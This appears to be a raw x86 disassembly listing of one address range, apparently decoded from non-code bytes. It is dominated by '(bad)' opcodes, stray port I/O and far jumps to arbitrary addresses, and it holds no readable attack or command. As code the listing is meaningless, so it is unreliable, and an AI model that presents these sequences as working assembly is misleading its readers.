  42b525:	int    0xc7
  42b527:	(bad)  
  42b529:	retf   0xeef4
  42b52c:	jmp    0xdcbe:0xf5eff0d1
  42b533:	imul   bl
  42b535:	imul   cl
  42b537:	fadd   st(4),st
  42b539:	pop    es
  42b53a:	fsubr  st(3),st
  42b53c:	or     DWORD PTR [edi],eax
  42b53e:	(bad)  
  42b53f:	fdivrp st(6),st
  42b541:	mov    bh,0xc7
  42b543:	xlat   BYTE PTR ds:[ebx]
  42b544:	out    dx,al
  42b545:	mov    cl,0xb6
  42b547:	repz in eax,0xd8
  42b54a:	fxtract 
  42b54c:	sti    
  42b54d:	(bad)  
  42b54e:	xlat   BYTE PTR ds:[ebx]
  42b54f:	aam    0xc3
  42b551:	loope  0x42b555
  42b553:	loop   0x42b528
  42b555:	jecxz  0x42b54d
  42b557:	(bad)  
  42b558:	or     bh,bh
  42b55a:	loope  0x42b541
  42b55c:	into   
  42b55d:	(bad)  
  42b55e:	(bad)  
  42b55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b560:	mov    bl,0xde
  42b562:	shr    dh,1
  42b564:	mov    ah,0xe2
  42b566:	fadd   st,st(7)
  42b568:	fucomi st,st(3)
  42b56a:	aad    0xfb
  42b56c:	add    ebx,ecx
  42b56e:	in     eax,dx
  42b56f:	add    dh,bl
  42b571:	idiv   BYTE PTR [esi-0x401e2e1d]
  42b577:	ror    edx,0xe3
  42b57a:	fisttp QWORD PTR [esi]
  42b57c:	jmp    0x42b556
  42b57e:	repz fucom st(4)
  42b581:	out    0xb6,eax
  42b583:	in     eax,0xda
  42b585:	into   
  42b586:	aam    0xae
  42b588:	int3   
  42b589:	(bad)  
  42b58b:	mov    ebp,0xd4cdc8d2
  42b590:	iret   
  42b591:	rcl    esi,0xbe
  42b594:	xlat   BYTE PTR ds:[ebx]
  42b595:	out    0xeb,al
  42b597:	jecxz  0x42b595
  42b599:	call   0xdb26b477
  42b59e:	shl    cl,1
  42b5a0:	loope  0x42b568
  42b5a2:	mov    dl,0xc1
  42b5a4:	shl    BYTE PTR [ebp-0xc2e2e17],1
  42b5aa:	fdiv   st,st(0)
  42b5ac:	mov    esp,0xf8d0fff7
  42b5b1:	ror    esp,1
  42b5b3:	aad    0xf4
  42b5b5:	push   es
  42b5b6:	retf   
  42b5b7:	aam    0xca
  42b5b9:	out    dx,eax
  42b5ba:	(bad)  
  42b5bb:	clc    
  42b5bc:	jmp    0xc2e6:0xa5cece03
  42b5c3:	ror    dl,1
  42b5c5:	jmp    0xcaf5:0xcdc5cccf
  42b5cc:	mov    esp,0xf3f2b7d1
  42b5d1:	ret    0x4c1
  42b5d4:	mov    al,0x1
  42b5d7:	fadd   DWORD PTR [edx]
  42b5d9:	sti    
  42b5da:	jmp    0x42b5a9
  42b5dc:	(bad)  
  42b5de:	jmp    0xd0c5:0xaed0e1bd
  42b5e5:	out    dx,al
  42b5e6:	loope  0x42b5a0
  42b5e8:	dec    ch
  42b5ea:	leave  
  42b5eb:	clc    
  42b5ec:	mov    edi,0xf6bc00ec
  42b5f1:	(bad)  
  42b5f2:	loope  0x42b5e4
  42b5f4:	shl    dl,1
  42b5f6:	(bad)
  42b5f9:	add    eax,0x6d9fced
  42b5fe:	test   eax,0xd7c7eac7
  42b603:	les    esi,FWORD PTR [eax-0x10492f30]
  42b609:	out    dx,eax
  42b60a:	into   
  42b60b:	rcl    al,1
  42b60d:	clc    
  42b60e:	mov    esi,0xfbf1d500
  42b613:	loop   0x42b619
  42b615:	sti    
  42b616:	pop    es
  42b617:	(bad)  
  42b618:	in     al,0x5
  42b61a:	fldlg2 
  42b61c:	out    0x3,eax
  42b61e:	icebp  
  42b61f:	fdiv   DWORD PTR [edi-0x3a513419]
  42b625:	(bad)  
  42b626:	enter  0xe8df,0xd1
  42b62a:	mov    esi,0xf102b8d5
  42b62f:	add    dl,bl
  42b631:	in     eax,0xc0
  42b633:	or     edi,ecx
  42b635:	jmp    0x42b63e
  42b637:	(bad)  
  42b638:	(bad)  
  42b63a:	in     al,0x7
  42b63c:	out    dx,al
  42b63d:	fnstsw WORD PTR [esi-0x54131b3e]
  42b643:	lock mov ch,0xc7
  42b646:	out    0xe4,al
  42b648:	(bad)  
  42b649:	lods   al,BYTE PTR ds:[esi]
  42b64a:	(bad)  
  42b64c:	cld    
  42b64d:	(bad)  
  42b64e:	jecxz  0x42b624
  42b650:	rcl    ebx,cl
  42b652:	pop    es
  42b653:	fdiv   st,st(5)
  42b655:	in     eax,0xf9
  42b657:	(bad)  
  42b658:	(bad)  
  42b65a:	loop   0x42b663
  42b65c:	call   0xa9238539
  42b661:	(bad)  
  42b662:	(bad)
  42b666:	scas   eax,DWORD PTR es:[edi]
  42b667:	(bad)  
  42b668:	into   
  42b669:	sar    DWORD PTR [ecx-0x480a4122],1
  42b66f:	shl    dh,cl
  42b671:	sar    esp,1
  42b673:	add    al,0xd9
  42b675:	rcl    ah,cl
  42b677:	aad    0x1
  42b679:	shr    ch,0xd8
  42b67c:	int    0xd8
  42b67e:	fnop   
  42b680:	icebp  
  42b681:	mov    al,0xea
  42b683:	jmp    0xf7f29774
  42b688:	repnz aam 0xf4
  42b68b:	jmp    0xbaffaa5e
  42b690:	in     eax,dx
  42b691:	mov    ebp,0xf0d5bedc
  42b696:	pop    es
  42b697:	fmul   DWORD PTR [ebx]
  42b699:	pop    es
  42b69a:	aad    0xfe
  42b69c:	(bad)  
  42b69e:	(bad)  
  42b69f:	in     eax,dx
  42b6a0:	repz (bad) 
  42b6a2:	rcl    ecx,1
  42b6a4:	mov    cl,0xc6
  42b6a6:	mov    cl,0xb9
  42b6a8:	in     eax,0xdd
  42b6aa:	iret   
  42b6ab:	jecxz  0x42b684
  42b6ad:	(bad)  
  42b6af:	sar    BYTE PTR [ebp+0x3f3c5d0],1
  42b6b5:	loope  0x42b67e
  42b6b7:	fmulp  st(3),st
  42b6b9:	or     dl,cl
  42b6bb:	(bad)  
  42b6bc:	(bad)  
  42b6be:	shr    ebx,0xa9
  42b6c1:	repnz jecxz 0x42b685
  42b6c4:	loope  0x42b6b8
  42b6c6:	jmp    0x42b693
  42b6c8:	mov    cl,0xc6
  42b6ca:	iret   
  42b6cb:	into   
  42b6cc:	fcmove st,st(2)
  42b6ce:	mov    ebx,0xf0d5bcd1
  42b6d3:	(bad)  
  42b6d4:	stc    
  42b6d5:	test   BYTE PTR [ecx],0x6
  42b6d8:	retf   0xd9c4
  42b6db:	iret   
  42b6dc:	or     al,0xda
  42b6de:	in     al,0xe6
  42b6e0:	out    dx,eax
  42b6e1:	enter  0xfbdd,0xc6
  42b6e5:	in     al,dx
  42b6e6:	mov    ch,0xb2
  42b6e8:	(bad)  
  42b6e9:	(bad)  
  42b6eb:	(bad)  
  42b6ec:	mov    esp,0xf4c1fffa
  42b6f1:	(bad)  
  42b6f2:	lock add bh,dh
  42b6f5:	or     esp,esp
  42b6f7:	pop    es
  42b6f8:	iret   
  42b6f9:	jmp    0x42b706
  42b6fb:	or     eax,0xe3b313cb
  42b700:	(bad)  
  42b701:	xlat   BYTE PTR ds:[ebx]
  42b702:	rol    ebx,cl
  42b704:	icebp  
  42b705:	in     al,0xce
  42b707:	jmp    0x42b6d5
  42b709:	std    
  42b70a:	int    0xf0
  42b70c:	mov    ecx,0xf2f2d7d7
  42b711:	std    
  42b712:	(bad)  
  42b713:	clc    
  42b714:	mov    esp,0xe8e4c3e2
  42b719:	dec    BYTE PTR [edx]
  42b71b:	(bad)  
  42b71c:	loopne 0x42b6f6
  42b71e:	repz int3 
  42b720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b721:	into   
  42b722:	lods   al,BYTE PTR ds:[esi]
  42b723:	vshufpd ymm6,ymm7,ymm1,0xee
  42b728:	mov    ch,0xe6
  42b72a:	leave  
  42b72b:	clc    
  42b72c:	(bad)  
  42b72d:	mov    ebp,0xdac0d4dc
  42b732:	mov    esi,0xdcf5d0c2
  42b737:	mov    bh,0x7
  42b73a:	add    al,0xdf
  42b73c:	int    0x7
  42b73e:	(bad)  
  42b73f:	int    0xeb
  42b741:	int3   
  42b742:	mov    bh,0xb5
  42b744:	loop   0x42b71a
  42b746:	into   
  42b747:	mov    eax,0xfab6c6e4
  42b74c:	iret   
  42b74d:	fnstsw WORD PTR [ecx-0x13472807]
  42b753:	add    esi,edi
  42b755:	pop    es
  42b756:	fdiv   st(1),st
  42b758:	(bad)  
  42b759:	enter  0xcd0c,0xe7
  42b75d:	ffree  st(0)
  42b75f:	repnz (bad) 
  42b762:	rcl    al,0xd2
  42b765:	rcl    dl,cl
  42b767:	fidiv  DWORD PTR [edi+edi*8-0x10063706]
  42b76e:	lock repz lock stc 
  42b772:	push   ebx
  42b774:	jecxz  0x42b781
  42b776:	fdivrp st(4),st
  42b778:	(bad)  
  42b779:	in     eax,0xfb
  42b77b:	add    al,0x1
  42b77d:	loop   0x42b75d
  42b77f:	int    0xaf
  42b781:	faddp  st(3),st
  42b783:	out    dx,eax
  42b784:	lock in eax,dx
  42b786:	iret   
  42b787:	(bad)  
  42b788:	fdivrp st(6),st
  42b78a:	sti    
  42b78b:	retf   0xe1fd
  42b78e:	std    
  42b78f:	idiv   dl
  42b791:	in     eax,dx
  42b792:	loopne 0x42b775
  42b794:	bnd ret 0xfbd5
  42b798:	rcr    ecx,0xc7
  42b79b:	or     cl,cl
  42b79d:	or     edi,DWORD PTR [edi-0x3e1e2d35]
  42b7a3:	(bad)  
  42b7a4:	(bad)  
  42b7a5:	test   al,0xee
  42b7a7:	aam    0xcf
  42b7a9:	out    dx,al
  42b7aa:	cld    
  42b7ab:	(bad)  
  42b7ad:	not    ecx
  42b7af:	clc    
  42b7b0:	fdivr  st,st(4)
  42b7b2:	add    eax,esi
  42b7b4:	sti    
  42b7b5:	lock jecxz 0x42b78f
  42b7b8:	sti    
  42b7b9:	fdivr  st,st(7)
  42b7bb:	into   
  42b7bc:	fild   WORD PTR [esi]
  42b7be:	in     eax,0xce
  42b7c0:	imul   BYTE PTR [ebp-0x28562e31]
  42b7c6:	fcmovbe st,st(1)
  42b7c8:	in     eax,dx
  42b7c9:	rcr    ch,1
  42b7cb:	icebp  
  42b7cc:	shl    bl,1
  42b7ce:	iret   
  42b7cf:	cld    
  42b7d0:	in     al,dx
  42b7d1:	jecxz  0x42b798
  42b7d3:	fcmovnbe st,st(4)
  42b7d5:	cld    
  42b7d6:	ret    0x9f5
  42b7d9:	add    ecx,DWORD PTR [esi]
  42b7db:	or     BYTE PTR [ecx],cl
  42b7dd:	enter  0xadab,0xce
  42b7e1:	cmc    
  42b7e2:	retf   
  42b7e3:	(bad)  
  42b7e4:	shl    BYTE PTR [ecx+eax*8-0x25401516],cl
  42b7eb:	mov    ecx,0xf8d2f9d2
  42b7f0:	rol    BYTE PTR [eax],cl
  42b7f2:	rcr    eax,cl
  42b7f4:	clc    
  42b7f5:	cld    
  42b7f6:	icebp  
  42b7f7:	mov    esi,0xf4c30808
  42b7fc:	shr    ecx,0xe5
  42b7ff:	icebp  
  42b800:	in     eax,0xf3
  42b802:	repnz cmc 
  42b804:	into   
  42b805:	lock in eax,dx
  42b807:	shl    DWORD PTR [edi-0x14024931],1
  42b80d:	out    dx,eax
  42b80e:	mov    bh,0xef
  42b810:	fcom   st(3)
  42b812:	pop    es
  42b813:	(bad)  
  42b814:	mov    ebp,0xfae6f7c2
  42b819:	leave  
  42b81a:	(bad)  
  42b81b:	or     eax,esp
  42b81d:	cli    
  42b81e:	in     eax,0xb3
  42b820:	scas   al,BYTE PTR es:[edi]
  42b821:	shl    esi,1
  42b823:	lock into 
  42b825:	mov    bh,0xc6
  42b827:	(bad)  
  42b829:	(bad)  
  42b82a:	mov    esi,0xcfeafbc9
  42b82f:	add    cl,ah
  42b831:	add    esi,esi
  42b833:	add    eax,0xd0f4e302
  42b838:	fcos   
  42b83a:	(bad)  
  42b83b:	fdivp  st(3),st
  42b83d:	cld    
  42b83e:	out    0xe2,al
  42b840:	mov    cl,0xe8
  42b842:	icebp  
  42b843:	sti    
  42b844:	jmp    0xc82e900e
  42b849:	clc    
  42b84a:	dec    ch
  42b84c:	rcr    cl,cl
  42b84e:	clc    
  42b84f:	shl    dl,1
  42b851:	mov    BYTE PTR [eax],0xd6
  42b854:	(bad)  
  42b855:	(bad)  
  42b857:	or     esi,edi
  42b859:	loopne 0x42b866
  42b85b:	sti    
  42b85c:	in     al,dx
  42b85d:	fdivrp st(1),st
  42b85f:	lods   eax,DWORD PTR ds:[esi]
  42b860:	retf   
  42b861:	mov    ebp,0xb0ebd7d5
  42b866:	hlt    
  42b867:	shl    al,1
  42b869:	jmp    0x42b842
  42b86b:	aam    0xd1
  42b86d:	add    DWORD PTR [edx-0x411ef824],edi
  42b873:	cmc    
  42b874:	cli    
  42b875:	push   es
  42b876:	push   es
  42b877:	loopne 0x42b839
  42b879:	(bad)  
  42b87b:	std    
  42b87c:	iret   
  42b87d:	or     eax,0xebccb8c2
  42b882:	int    0xe6
  42b884:	(bad)  
  42b885:	aad    0xf1
  42b887:	aad    0xb0
  42b889:	int    0xc9
  42b88b:	repz cmc 
  42b88d:	out    dx,al
  42b88e:	fdiv   DWORD PTR [esi+0x5d2bfe7]
  42b894:	cld    
  42b895:	add    eax,0xa0af809
  42b89a:	call   0xca54a49a
  42b89f:	sar    DWORD PTR [ecx+esi*8-0x5312f0d],0xb3
  42b8a7:	div    edi
  42b8a9:	hlt    
  42b8aa:	mov    dh,0xee
  42b8ac:	icebp  
  42b8ad:	fdivr  DWORD PTR [ecx-0xd33214a]
  42b8b3:	push   es
  42b8b4:	jmp    0x42b893
  42b8b6:	hlt    
  42b8b7:	add    ebx,esp
  42b8b9:	or     edi,eax
  42b8bb:	leave  
  42b8bc:	jmp    0xc8cb:0xd1f1a8d8
  42b8c3:	repnz in al,dx
  42b8c5:	out    dx,eax
  42b8c6:	repz mov ecx,0x3fceac8
  42b8cc:	ret    
  42b8cd:	sar    BYTE PTR [edx-0xff4605],1
  42b8d3:	frstpm(287 only) 
  42b8d5:	fild   DWORD PTR [ebx]
  42b8d7:	out    0xd9,al
  42b8d9:	retf   0xe80b
  42b8dc:	int    0xe8
  42b8de:	jmp    0xad117f89
  42b8e3:	lock cli 
  42b8e5:	xlat   BYTE PTR ds:[ebx]
  42b8e6:	shl    bh,cl
  42b8e8:	hlt    
  42b8e9:	(bad)  
  42b8ea:	jmp    0x42b8d9
  42b8ec:	cli    
  42b8ed:	aad    0xfb
  42b8ef:	repz mov eax,0xddd301f2
  42b8f5:	bnd ret 
  42b8f7:	test   esi,0xcb01e3f5
  42b8fd:	jmp    0x42b8d7
  42b8ff:	out    dx,eax
  42b900:	mov    esp,0xe6e4efb1
  42b905:	rcr    ecx,cl
  42b907:	(bad)  
  42b908:	mov    ebx,0xedf8bdd0
  42b90d:	mov    edi,0xded7fbd0
  42b912:	test   BYTE PTR [edi],0xb
  42b915:	fucomip st,st(2)
  42b917:	jmp    0x42b91b
  42b919:	aam    0xdd
  42b91b:	por    mm1,QWORD PTR [edx]
  42b91e:	in     eax,0xae
  42b920:	rol    esp,cl
  42b922:	lods   al,BYTE PTR ds:[esi]
  42b923:	out    dx,al
  42b924:	loop   0x42b8ed
  42b926:	in     eax,dx
  42b927:	(bad)  
  42b929:	stc    
  42b92a:	cli    
  42b92b:	hlt    
  42b92c:	(bad)  
  42b92d:	jmp    0x112b0f5
  42b932:	cld    
  42b933:	int3   
  42b934:	(bad)  
  42b936:	loopne 0x42b91e
  42b938:	pop    es
  42b939:	fmul   st(0),st
  42b93b:	loopne 0x42b94f
  42b93d:	out    0xed,eax
  42b93f:	loopne 0x42b8f1
  42b941:	scas   eax,DWORD PTR es:[edi]
  42b942:	fnsave [edi-0x4a0e193d]
  42b948:	out    0xf2,al
  42b94a:	cli    
  42b94b:	sti    
  42b94c:	icebp  
  42b94d:	lock enter 0x3f5,0xfa
  42b952:	add    esp,ebx
  42b954:	mov    ebp,0x107e5df
  42b959:	test   bl,0xdb
  42b95c:	add    al,0xfa
  42b95e:	repnz mov bl,0xe3
  42b961:	rcl    bl,1
  42b963:	mov    ah,0xc7
  42b965:	mov    edx,0xd6b0e4b9
  42b96a:	in     al,dx
  42b96b:	hlt    
  42b96c:	clc    
  42b96d:	sar    esp,cl
  42b96f:	std    
  42b970:	mov    edi,0xe6ccc6f0
  42b975:	ret    
  42b976:	fcomi  st,st(7)
  42b978:	enter  0x9fd,0xdb
  42b97c:	fst    QWORD PTR [ebx]
  42b97e:	in     al,0xb1
  42b980:	test   al,0xc8
  42b982:	loope  0x42b975
  42b984:	test   dh,0xd9
  42b987:	sar    DWORD PTR [edi-0x162f0b05],cl
  42b98d:	mov    al,0x0
  42b98f:	int    0xef
  42b991:	aam    0x6
  42b993:	rol    DWORD PTR ds:0xd5dbf4f7,cl
  42b999:	rcr    ch,0xa
  42b99c:	or     al,0xd2
  42b99e:	mov    ecx,0xb2c0bfee
  42b9a3:	jmp    0xd8ce:0xd9d4d5d5
  42b9aa:	fidivr WORD PTR [edi-0x11f212f]
  42b9b0:	(bad)  
  42b9b1:	in     al,dx
  42b9b2:	icebp  
  42b9b3:	(bad)  
  42b9b5:	bnd jmp edx
  42b9b8:	(bad)  
  42b9ba:	add    DWORD PTR [ecx],eax
  42b9bc:	push   cs
  42b9bd:	into   
  42b9be:	scas   eax,DWORD PTR es:[edi]
  42b9bf:	repnz out 0xd1,al
  42b9c2:	retf   
  42b9c3:	jmp    0xe8e9:0xdfdaf6b6
  42b9ca:	mov    ecx,0xc8f7fae3
  42b9cf:	mov    ecx,0xd4e1e3b8
  42b9d4:	shr    ecx,cl
  42b9d6:	push   es
  42b9d7:	retf   0xfc06
  42b9da:	pop    es
  42b9db:	jmp    0xa4b3:0xa8b2ccda
  42b9e2:	jmp    0xf50482cc
  42b9e7:	in     eax,dx
  42b9e8:	sar    DWORD PTR [eax-0x29330f08],1
  42b9ee:	aam    0xe2
  42b9f0:	rcl    dh,1
  42b9f2:	cmc    
  42b9f3:	add    dh,cl
  42b9f5:	add    al,ah
  42b9f7:	out    0xdc,eax
  42b9f9:	retf   
  42b9fa:	jecxz  0x42b9ff
  42b9fc:	add    eax,0xc9bfbede
  42ba01:	shl    esi,cl
  42ba03:	leave  
  42ba04:	(bad)  
  42ba06:	sti    
  42ba07:	repz int 0xbf
  42ba0a:	mov    ebp,0xbcfcefb6
  42ba0f:	repz sar dl,0x7
  42ba13:	mov    edx,0xc0f7d4f6
  42ba18:	retf   
  42ba19:	or     dl,bh
  42ba1b:	(bad)  
  42ba1c:	movhlps xmm0,xmm7
  42ba1f:	fmul   st(0),st
  42ba21:	mov    ebp,0xd0cac5c1
  42ba26:	mov    ch,0xb8
  42ba29:	in     al,0xfb
  42ba2b:	fcmovnbe st,st(7)
  42ba2d:	retf   0xf6cc
  42ba30:	lock mov ebp,0xfbc1f5de
  42ba36:	aad    0xc7
  42ba38:	jmp    0xafe0:0xe313cde2
  42ba3f:	retf   0xadaf
  42ba42:	div    BYTE PTR [ecx-0x2e354a]
  42ba48:	shr    dh,1
  42ba4a:	fnstsw WORD PTR [ebx-0x2020036]
  42ba50:	repnz cld 
  42ba52:	hlt    
  42ba53:	out    0xf4,al
  42ba55:	mov    eax,0xf5cbfac3
  42ba5a:	retf   
  42ba5b:	stc    
  42ba5c:	add    esi,esp
  42ba5e:	mov    dl,0xdf
  42ba60:	icebp  
  42ba61:	in     al,0xad
  42ba63:	in     eax,dx
  42ba64:	out    dx,al
  42ba65:	(bad)  
  42ba66:	fdecstp 
  42ba68:	iret   
  42ba69:	clc    
  42ba6a:	jmp    0xdd00ba52
  42ba6f:	jecxz  0x42ba66
  42ba71:	loope  0x42ba35
  42ba73:	not    esi
  42ba75:	fild   DWORD PTR ds:0xe6dec5c4
  42ba7b:	(bad)  
  42ba7d:	in     eax,dx
  42ba7e:	repz iret 
  42ba80:	not    ebx
  42ba82:	les    esi,FWORD PTR [esi-0x35252f0d]
  42ba88:	fdiv   DWORD PTR [ebp+0x2ceedba]
  42ba8e:	shr    ebp,1
  42ba90:	(bad)  
  42ba92:	repnz (bad) 
  42ba94:	mov    esp,0xc604f8dc
  42ba99:	fld    st(5)
  42ba9b:	retf   0xe808
  42ba9e:	mov    esp,0xafc3d3dd
  42baa3:	(bad)  
  42baa4:	retf   0xe0ea
  42baa7:	jmp    0xcd0da85d
  42baac:	icebp  
  42baad:	fidivr DWORD PTR [eax-0x40392c40]
  42bab3:	or     ebx,ebp
  42bab5:	fmul   QWORD PTR [edx]
  42bab7:	push   es
  42bab8:	(bad)  
  42bab9:	(bad)  
  42baba:	cld    
  42babb:	cld    
  42babc:	add    BYTE PTR [edi],cl
  42babe:	mov    esp,0xcae0d1e9
  42bac3:	retf   
  42bac4:	in     al,dx
  42bac5:	mov    al,0xb0
  42bac7:	stc    
  42bac8:	in     eax,dx
  42bac9:	(bad)  
  42bacb:	(bad)  
  42bacd:	mov    ebp,0xe2beccd2
  42bad2:	idiv   dl
  42bad4:	rcl    ebp,1
  42bad6:	add    eax,0xf90106d7
  42badb:	loopne 0x42bacf
  42badd:	push   es
  42bade:	loop   0x42babc
  42bae0:	into   
  42bae1:	out    0xc4,al
  42bae3:	int3   
  42bae4:	enter  0xcdc6,0xf4
  42bae8:	aam    0xd6
  42baea:	into   
  42baeb:	repnz int 0xe1
  42baee:	repz sti 
  42baf0:	int    0xf0
  42baf2:	rcl    dl,cl
  42baf4:	rol    esp,cl
  42baf6:	leave  
  42baf7:	enter  0xfd7,0xdd
  42bafb:	push   cs
  42bafc:	repnz cld 
  42bafe:	scas   al,BYTE PTR es:[edi]
  42baff:	retf   0xf3c1
  42bb02:	test   ebx,0xf2fbe1c7
  42bb08:	call   0xde0b86c1
  42bb0d:	jmp    0xc3f1:0xfbdfe8e8
  42bb14:	mov    esp,0xc8fcc4dc
  42bb19:	loopne 0x42bafd
  42bb1b:	into   
  42bb1c:	cld    
  42bb1d:	jecxz  0x42bae8
  42bb1f:	xlat   BYTE PTR ds:[ebx]
  42bb20:	sar    BYTE PTR [esi+esi*8-0x7573c37],cl
  42bb27:	out    dx,al
  42bb28:	cli    
  42bb29:	icebp  
  42bb2a:	imul   esi
  42bb2c:	shl    bh,1
  42bb2e:	cli    
  42bb2f:	in     eax,dx
  42bb30:	lock repz test bh,0xf2
  42bb35:	test   ecx,0xafbc8c8
  42bb3b:	int    0xc9
  42bb3d:	repnz out dx,eax
  42bb3f:	les    ebp,FWORD PTR [ecx-0x251a0f39]
  42bb45:	enter  0xb6e5,0xec
  42bb49:	int    0xf1
  42bb4b:	mul    dl
  42bb4d:	mov    esp,0xe702d4c3
  42bb52:	cmc    
  42bb53:	cmc    
  42bb54:	ffree  st(6)
  42bb56:	add    ebx,ebp
  42bb58:	ftst   
  42bb5a:	leave  
  42bb5b:	std    
  42bb5c:	push   ebx
  42bb5e:	out    0xad,eax
  42bb60:	in     eax,dx
  42bb61:	(bad)  
  42bb62:	scas   al,BYTE PTR es:[edi]
  42bb63:	xlat   BYTE PTR ds:[ebx]
  42bb64:	int3   
  42bb65:	sar    bl,0xf0
  42bb68:	in     al,dx
  42bb69:	mov    al,0xba
  42bb6b:	cli    
  42bb6c:	into   
  42bb6d:	std    
  42bb6e:	jecxz  0x42bb62
  42bb70:	(bad)  
  42bb71:	loop   0x42bb59
  42bb73:	not    ebp
  42bb75:	(bad)  
  42bb77:	push   es
  42bb78:	mul    ebp
  42bb7a:	add    eax,0xe5daeddf
  42bb7f:	rcr    ebp,cl
  42bb81:	scas   al,BYTE PTR es:[edi]
  42bb82:	int    0xcf
  42bb84:	ret    0xd7b5
  42bb87:	hlt    
  42bb88:	mov    edi,0xf803fdd5
  42bb8d:	mov    esp,0xc600f0f2
  42bb92:	stc    
  42bb93:	add    bl,al
  42bb95:	or     bl,dl
  42bb97:	add    eax,0xfc07cedc
  42bb9c:	add    eax,ebx
  42bb9e:	mov    esi,0xe5b7c0ef
  42bba3:	mov    bl,0xf6
  42bba5:	out    0xcc,eax
  42bba7:	int3   
  42bba8:	cli    
  42bba9:	out    dx,eax
  42bbaa:	fcmovnu st,st(4)
  42bbac:	idiv   DWORD PTR [eax+0x5f8fcf6]
  42bbb2:	(bad)  
  42bbb3:	mov    DWORD PTR [ecx],0x7e4fcd9
  42bbb9:	iret   
  42bbba:	aam    0xdc
  42bbbc:	add    ch,dh
  42bbbe:	mov    ecx,0xaeafe2bf
  42bbc3:	ret    0xf2ea
  42bbc6:	mov    bl,0xf1
  42bbc8:	xbegin 0xdefd92a2
  42bbce:	mov    edx,0xe0e0e001
  42bbd3:	(bad)  
  42bbd4:	fld    st(5)
  42bbd6:	mov    DWORD PTR [edi],0xf4cfdd05
  42bbdc:	rol    DWORD PTR [esi],0xee
  42bbdf:	mov    bl,0xbf
  42bbe1:	xlat   BYTE PTR ds:[ebx]
  42bbe2:	ret    
  42bbe3:	retf   0xbad6
  42bbe6:	(bad)  
  42bbe7:	mov    eax,0xcfd4c8c5
  42bbec:	sar    ebp,1
  42bbee:	cld    
  42bbef:	neg    dl
  42bbf1:	cli    
  42bbf2:	add    edi,DWORD PTR [ecx+esi*8+0x7ffddc1]
  42bbf9:	out    dx,eax
  42bbfa:	fild   DWORD PTR [esp+ebx*8]
  42bbfd:	(bad)  
  42bbff:	(bad)
  42bc02:	call   0xd41d88be
  42bc07:	mov    eax,0xcbecffd9
  42bc0c:	enter  0xedea,0xda
  42bc10:	shl    ebx,1
  42bc12:	add    eax,0xdeebdd05
  42bc17:	rol    ch,1
  42bc19:	hlt    
  42bc1a:	fild   DWORD PTR [eax+ebx*8]
  42bc1d:	add    eax,0xe6edf7cc
  42bc22:	iret   
  42bc23:	xlat   BYTE PTR ds:[ebx]
  42bc24:	jmp    0x42bbce
  42bc26:	iret   
  42bc27:	enter  0xc5ad,0xd5
  42bc2b:	mov    esp,0x200dfbd
  42bc30:	mov    esi,0xe5c3c1d7
  42bc35:	shl    esp,0xbe
  42bc38:	add    eax,0xe90f08df
  42bc3d:	into   
  42bc3e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc40:	mov    bh,0xef
  42bc42:	aad    0xc0
  42bc44:	mov    dh,0xb2
  42bc46:	out    0xae,al
  42bc48:	jmp    0xc2f9:0xfcc4d3d4
  42bc4f:	add    al,BYTE PTR [eax]
  42bc51:	pop    es
  42bc52:	in     al,dx
  42bc53:	mov    esi,0xdcbfd9d7
  42bc58:	iret   
  42bc59:	fsqrt  
  42bc5b:	call   0xb41fc753
  42bc60:	loop   0x42bc3e
  42bc62:	retf   0xf2f6
  42bc65:	iret   
  42bc66:	sar    BYTE PTR [edx-0x46110c41],cl
  42bc6c:	mov    ch,0xef
  42bc6e:	cmc    
  42bc6f:	cmc    
  42bc70:	hlt    
  42bc71:	int    0xc1
  42bc73:	loop   0x42bc7c
  42bc75:	add    eax,0xd6ffc7ca
  42bc7a:	sti    
  42bc7b:	sti    
  42bc7c:	add    eax,0xded3d9fe
  42bc81:	jecxz  0x42bc43
  42bc83:	xlat   BYTE PTR ds:[ebx]
  42bc84:	mov    bh,0xb2
  42bc87:	mov    dh,0xcf
  42bc89:	fsubr  st,st(0)
  42bc8b:	aam    0xbf
  42bc8d:	jecxz  0x42bc57
  42bc8f:	aad    0xde
  42bc91:	add    eax,0xe7d1f0e4
  42bc96:	clc    
  42bc97:	xlat   BYTE PTR ds:[ebx]
  42bc98:	fcmovne st,st(2)
  42bc9a:	add    ebx,ebx
  42bc9c:	cli    
  42bc9d:	or     bh,bl
  42bc9f:	loop   0x42bc7f
  42bca1:	icebp  
  42bca2:	aad    0xbc
  42bca4:	test   eax,0xd5caece4
  42bca9:	hlt    
  42bcaa:	mov    bh,0xcd
  42bcac:	leave  
  42bcad:	repz cmc 
  42bcaf:	fcomi  st,st(3)
  42bcb1:	fdivr  st,st(0)
  42bcb3:	fimul  DWORD PTR [ebx]
  42bcb5:	lock add al,0xff
  42bcb8:	loop   0x42bc89
  42bcba:	(bad)  
  42bcbb:	adc    ecx,DWORD PTR [edi]
  42bcbd:	icebp  
  42bcbe:	leave  
  42bcbf:	mov    esi,0xc3e3f0e0
  42bcc4:	jmp    0x42bc76
  42bcc6:	shl    DWORD PTR [esi-0x2b123453],cl
  42bccc:	mov    ebx,0xe7bfd4ee
  42bcd1:	mov    edi,0xe6e2bce0
  42bcd6:	or     ecx,ebx
  42bcd8:	or     dl,cl
  42bcda:	add    dl,ah
  42bcdc:	(bad)  
  42bcdd:	adc    DWORD PTR [ecx-0x301c2952],edi
  42bce3:	fnclex 
  42bce5:	test   al,0xc5
  42bce7:	int    0xb5
  42bce9:	leave  
  42bcea:	(bad)  
  42bcec:	in     eax,dx
  42bced:	(bad)  
  42bcef:	std    
  42bcf0:	mov    DWORD PTR [ecx],0xd9c0c1e5
  42bcf6:	add    eax,edi
  42bcf8:	in     al,0xde
  42bcfa:	int    0xe8
  42bcfc:	cld    
  42bcfd:	retf   
  42bcfe:	fst    st(7)
  42bd00:	repnz not bl
  42bd03:	(bad)
  42bd06:	mov    dl,0xdf
  42bd08:	(bad)  
  42bd0a:	(bad)  
  42bd0b:	(bad)  
  42bd0d:	mov    eax,0xfad6f9c2
  42bd12:	rcr    esi,0xf1
  42bd15:	aam    0xfa
  42bd17:	out    0xeb,eax
  42bd19:	pop    es
  42bd1a:	fucom  st(4)
  42bd1c:	add    edi,eax
  42bd1e:	fsubrp st(4),st
  42bd20:	(bad)  
  42bd21:	rcl    ecx,1
  42bd23:	jmp    0x42bd0e
  42bd25:	div    DWORD PTR [eax-0x483b4509]
  42bd2b:	test   ecx,0xdb02c9cc
  42bd31:	fld    st(1)
  42bd33:	jmp    0x42bd19
